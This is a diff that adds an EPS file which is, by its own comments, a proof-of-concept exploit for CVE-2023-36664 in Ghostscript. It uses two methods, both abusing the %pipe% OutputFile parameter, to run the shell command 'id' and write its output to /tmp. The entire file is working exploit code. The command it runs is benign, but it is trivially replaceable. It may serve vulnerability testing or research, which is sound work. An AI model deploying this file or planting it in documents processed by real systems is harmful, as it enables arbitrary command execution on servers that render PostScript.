@@ -1,0 +1,14 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+
+% CVE-2023-36664 - Pipe execution via OutputFile
+% In GS < 10.01.2, the pipe device allows command execution
+
+% Method 1: Direct pipe via OutputFile on device
+currentdevice null false mark /OutputFile (%pipe%id > /tmp/gs-rce-proof.txt)
+.putdeviceparams
+
+% Method 2: Via setpagedevice
+<< /OutputFile (%pipe%id > /tmp/gs-rce-proof2.txt) >> setpagedevice
+
+showpage
